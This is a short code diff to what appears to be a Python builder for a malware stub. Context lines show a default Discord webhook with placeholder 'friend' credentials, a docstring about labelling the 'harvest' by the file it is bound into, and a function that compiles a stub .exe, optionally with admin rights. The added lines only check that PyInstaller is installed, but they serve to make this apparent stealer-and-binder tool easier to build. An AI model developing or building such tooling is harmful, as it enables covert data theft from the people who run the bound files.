@@ -40,6 +40,20 @@ DEFAULT_WEBHOOK = ("https://discord.com/api/webhooks/"
                    "FRIEND_WEBHOOK_ID/FRIEND_WEBHOOK_TOKEN")
 
 
+def ensure_pyinstaller() -> None:
+    """Fail with the exact command instead of a bare ModuleNotFoundError."""
+    try:
+        import PyInstaller  # noqa: F401
+    except ModuleNotFoundError:
+        raise SystemExit(
+            "[!] PyInstaller is not installed for this interpreter:\n"
+            f"    {sys.executable}\n"
+            "    install it once:\n"
+            f'    "{sys.executable}" -m pip install --upgrade pyinstaller\n'
+            "    or double-click setup_deps.bat"
+        )
+
+
 def default_app_id(target: Path) -> str:
     """Label the harvest with the file it was actually bound into.
 
@@ -126,6 +140,7 @@ def _pyinstaller(icon: str | None, out_dir: Path, admin: bool = False) -> Path:
 
 
 def build_stub(icon: str | None, admin: bool = False) -> Path:
+    ensure_pyinstaller()
     key = _cache_key(icon, admin)
     cached = BUILD / f"stub_{key}.exe"
     if cached.is_file():
